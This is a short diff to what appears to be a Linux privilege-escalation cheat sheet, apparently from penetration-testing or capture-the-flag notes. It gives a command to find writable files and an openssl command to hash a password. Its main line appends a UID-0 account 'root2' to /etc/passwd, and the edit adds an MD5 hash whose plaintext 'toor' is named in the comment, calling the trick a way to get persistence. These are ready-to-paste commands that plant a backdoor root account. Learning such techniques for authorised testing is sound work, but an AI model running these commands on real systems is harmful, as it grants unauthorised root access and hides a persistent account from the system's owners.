@@ -1,5 +1,5 @@
 find / -writable -type f 2>/dev/null #<---Display writeable files.
-echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd #<--- If /etc/passwd is writeable.
+echo "root2:\$1\$OpQjzySv\$5a8SzrQPOMtIRfqfgQtxY.:0:0:root:/root:/bin/bash" >> /etc/passwd #<--- If /etc/passwd is writeable, make the user root2:toor. This also can be considered a way to achieve persistance in a machine.
 
 openssl passwd -1 #<--- Create a password hash for /etc/passwd file.
 
